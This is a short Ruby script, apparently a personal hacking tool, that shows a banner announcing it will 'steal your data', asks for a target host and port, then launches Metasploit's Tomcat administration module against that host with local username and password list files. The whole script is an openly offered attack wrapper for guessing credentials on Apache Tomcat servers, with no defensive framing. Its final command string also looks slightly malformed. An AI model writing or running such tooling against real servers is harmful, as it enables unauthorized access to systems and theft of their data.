puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

"""

puts " [?] What is the target? "
print "[!] ---> "
target = gets.chomp

puts " [?] What is the target port? "
print " [!] ---> "
port = gets.chomp

exec("msfconsole -x 'use admin/http/tomcat_administration' -x 'setg RHOSTS #{target}' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set TOMCAT_PASS /home/parrot/Desktop/MyExploits/PW.txt' -x 'set TOMCAT_USER /home/parrot/Desktop/MyExploits/Users.txt' -x 'run' 'run'")

